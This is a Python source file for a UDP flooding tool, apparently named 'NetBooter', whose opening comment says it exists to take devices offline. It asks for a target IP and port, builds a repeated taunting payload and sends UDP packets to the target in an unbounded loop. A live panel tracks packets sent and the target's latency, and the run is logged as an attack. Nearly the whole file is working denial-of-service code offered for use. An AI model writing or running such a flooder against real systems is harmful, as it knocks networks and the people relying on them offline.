# THIS WILL BE A PROGRAM THAT CAN TAKE DEVICES OFFLINE AND CAN ALSO BE TAKEN FURTHER WITH LAN ACCESS


# UI IMPORTS
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.console import Console
import pyfiglet
console = Console()



# NSM IMPORTS
from nsm_utilities import Utilities, NetTilities
from nsm_files import File_Handler

# NETWORK IMPORTS
import socket, ipaddress
from scapy.all import ARP, ICMP, sendp, conf


# ETC IMPORTS
import threading, requests, time, random



# FILE IMPORTS
from pathlib import Path
import json





class Packet_Creation():
    """This will be the starter class that will be imporved upon for packet creation"""

    def __init__(self):
        self.packets_sent = 0
        pass

    
    @staticmethod
    def get_valid_ip():
        """This method will be responsible for making sure the user inputs a valid ip address and port"""
        

        while True:
            try:
                
                
                # USER INPUTS IP AND PORT NUMBER
                target_ip = console.input("[bold red]Enter Target IP Address: ")

                if target_ip == "":
                    console.print("[bold blue]Defaulting to: 192.168.1.38")
                    time.sleep(.05)
                    return "192.168.1.38", 443

                # VALID IP // CANT RETURN THIS CAUSE SCAPY IS ASS LOL
                check_ip = ipaddress.ip_address(target_ip)


                target_port = console.input("[bold red]Enter Target Port: ")

                # VALID PORT
                check_port = int(target_port)


                # NOW TO RETURN VALID VARIABLES WITH VALID VALUES
                return target_ip, check_port

            

            except ValueError as e:
                console.print(f"[bold red]Invalid Port number: [yellow]{e}")

            
            except (ipaddress.AddressValueError, ipaddress.NetmaskValueError ) as e:
                console.print(f"[bold red]Invalid Target IP: [yellow]{e}")
            

            except Exception as e:
                console.print("[bold red]NSM_Logic Module Error: [yellow]",e)

    

    @staticmethod
    def get_payload():
        """This method will be responsible for crafting a payload to put inside of the forged packets"""
        

        # GET PAYLOAD FOR PACKET
        payload = console.input("[bold blue]Enter Payload: ")

        
        # CATCH NUMERICAL STRINGS
        if payload.isdigit():
            console.print("[bold blue]Defaulting to strict payload")
            return b"TESTING ATTACK"
        
        if payload:

            # COUNT THE CHAR AMOUNT
            char_count = 0

            for char in payload:
                char_count += 1

            if char_count <= 100:
                payload = payload * 10

            elif char_count >= 100 and char_count <= 299:
                payload = payload * 3 

            elif char_count >= 300 and char_count <= 500:
                payload = payload *2 
            

        
        else: 


            payload = b"U ARE UNDER ATTACK"
               

            # THIS WILL BE FOR FUTURE USE   
            payloads = [
                    b"U ARE BEING ATTACKED",
                    b"YOU ARE NOT BEING HACKED",
                    b"I REPEAT U ARE NOT BEING HACKED",
                    b"THIS IS A NETWORK WIDE OUTAGE TEST DONT WORRY",
                    b"I AM NOT RESPONSIBLE FOR ANY NETWORK COMPROMISES"
                ]
            
            return payload
               


    
    def udp_flood(self, target_port: int, target_ip: str, payload):
        """This method will be responsible for sending strictly udp packets"""
        

        # THIS CODE RIGHT HERE IS TEMP // LOL
        choice = console.input("Do you want a 0.5 time delay between packets being sent(empty string == yes, anything else is no): ").strip().lower()
        if choice == "":
            delay = True
        else:
            delay = False

        # ASSIGN VARIABLES
        self.packets_sent = 0
        time_start = time.time()
        time_total = 0
        loop = True
        net = NetTilities()
        

        
        # CREATE PANEL VARIABLES
        panel = Panel(
            title="Attack Analytics",
            style="yellow",
            border_style="bold red",
            renderable=f"[bold red]Total Packets Sent: [bold purple]{self.packets_sent}  |  [bold red]Time Elapsed: [bold purple]{time_total:.2f}  |  [bold red]Target Latency: [bold purple]False",          
            expand=False
                      )

        
        console.print("[bold green]\n\nNow launching attack")
        

        # LOOP THROUGH PACKET CREATION
        try:
            with Live(panel, console=console, refresh_per_second=4):
                while loop:
            
                        
                    # CREATE SECURE CONNECTION
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        
    
                        # FOR DEBUGGING
                        if loop == False:
                            console.print(f"{payload} --> {target_ip}:{target_port}")
                            s.connect_ex((target_port, target_ip))
                        

                        # SEND THE PACKET 
                        s.sendto(payload, (target_ip, target_port))

                        # APPEND TOTAL PACKETS SENT AND UPDATE TIME VARIABLE
                        self.packets_sent += 1
                        time_total = time.time() - time_start

                        
                        # BACKGROUND THREAD HANDLING
                        File_Handler.background_thread_controller(background_thread_status=True)
                        threading.Thread(target=net.pinger, args=(target_ip, console, 0.4, True), daemon=True).start()


                        # USE THIS SIMPLE LITTLE METHOD TO GET LATENCY AND OUTPUT RESULT
                        try:
                            latency = str(File_Handler.background_thread_pull_info(json_pull="latency"))
                            joined = [char for char in latency]
                            latency = (f"{joined[0]}{joined[1]}{joined[2]}{joined[3]}{joined[4]}") if joined else  False
                           
                            if delay:
                                console.print(joined)
                            
                        except Exception as e:
                            latency = e


                        # UPDATE VARIABLE VALUES
                        panel.renderable = f"[bold red]Total Packets Sent: [bold purple]{self.packets_sent}  |  [bold red]Time Elapsed: [bold purple]{time_total:.2f}  |  [bold red]Target Latency: [bold purple]{latency}"        

                        if delay:
                            time.sleep(.05)


                
                

        # THIS IS USED IN CASE THE USER WANTS TO STOP THE ATTACK
        except KeyboardInterrupt as e:
            console.print("[yellow]\n\nAttack paused")

            # KEEP TRACK OF PAUSED TIME
            time_paused = time.time()

            
            # LOOP IN CASE OF EXCEPTIONS
            while True:
                    
                    try:

                        # USER CHOOSES WHAT THEY WANT TO DO
                        choice = console.input("[bold red]Are u sure you want to end the Attack: ").strip().lower()
                        

                        # CHOICE == YES
                        if choice == "y" or choice == "yes" or choice == "true" or choice == "1":
                            
                            console.print("\n\n[bold green]Attack Successfully Terminated")


                            # REMOVE EXCESS TIME WASTE
                            time_total_paused = time.time() - time_paused
                            time_start = time_start - time_total_paused

                            # GET THE ATTACK LENGTH AND THEN OUTPUT RESULT
                            time_total = time.time() - time_start


                            
                            # KILL BACKGROUND THREAD
                            File_Handler.background_thread_controller(background_thread_status=True)


                            
                            # PRINT FINAL OUTPUT
                            console.print(
                                f"[bold green]Total Packets Sent:[/bold green] {self.packets_sent}\n",
                                f"[bold green]Total Attack length:[/bold green] {time_total:.2f}\n",
                                f"[bold green]Target Latency:[/bold green] {latency}"
                                        )
                            

                            # SAVE ATTACK RESULTS
                            File_Handler.save_attack(
                                target_ip=target_ip, 
                                attack_method="UDP Flood", 
                                attack_duration= f"{time_total:.2f}", 
                                total_packets_sent=self.packets_sent,
                                console=console
                                                        
                                )
                            


                            
                            time.sleep(1)
                            console.input("\n[bold red]Press Enter to Exit: ")

                            
                            # BREAK THE MAIN LOOP
                            loop = False
                            break
                        
                        
                        # CHOICE == NO
                        elif choice == "n" or choice == "no" or choice == "false" or choice == "0":

                            console.print("[bold green]Now resuming Attack")
                            time.sleep(1)


                            # REMOVE EXCESS TIME WASTE
                            time_total_paused = time.time() - time_paused
                            time_start = time_start - time_total_paused

                            break

                        
                        else:
                            console.print("[bold red]Invalid input")
                    
                    except KeyboardInterrupt as e:
                        console.print("[bold red]Stop trying to escape dummy,  lol")



        except Exception as e:
            console.print("[bold red]NSM_Logic Module Error: [yellow]",e)

            time.sleep(5)
             
    
    
    @staticmethod
    def welcome_title():
        """This will be the welcome title for the module"""
        
        print("\n\n\n")
        art = pyfiglet.figlet_format(text="       UDP\n", font="bloody")
        artt = pyfiglet.figlet_format(text="Flooooder", font="bloody")
        console.print(art, style="bold green")
        console.print(artt, style="bold red")
        print("\n")
        console.print(f"[yellow]Press Ctrl + C to end attack\n\n\n")

    
    @staticmethod
    def main():
        """Call upon class wide logic from this method"""


        # TELL THE USER HEY AND PRINT WELCOME MESSAGE
        Packet_Creation.welcome_title()
        Utilities.notify(msg="Launched NetBooter")
        
        
        # CALL UPON METHOD TO GET VALID VALUES FOR VARIABLES
        target_ip, target_port = Packet_Creation.get_valid_ip()
        

        # USE THIS TO GET A VALID PAYLOAD
        payload = Packet_Creation.get_payload()

        
        # NOW TO SEND USER TO THE UDP FLOODER METHOD
        Packet_Creation().udp_flood(target_port, target_ip, payload)


            

            
use = False


if __name__ == "__main__":

    if use:
        while True:

            payloads = [
                "U ARE BEING ATTACKED",
                "YOU ARE NOT BEING HACKED",
                "I REPEAT U ARE NOT BEING HACKED",
                "THIS IS A NETWORK WIDE OUTAGE TEST DONT WORRY",
                "I AM NOT RESPONSIBLE FOR ANY NETWORK COMPROMISES"
            ]
            
            for pay in payloads:
                console.print(pay)

                time.sleep(1)
    
    else:
        Packet_Creation.main()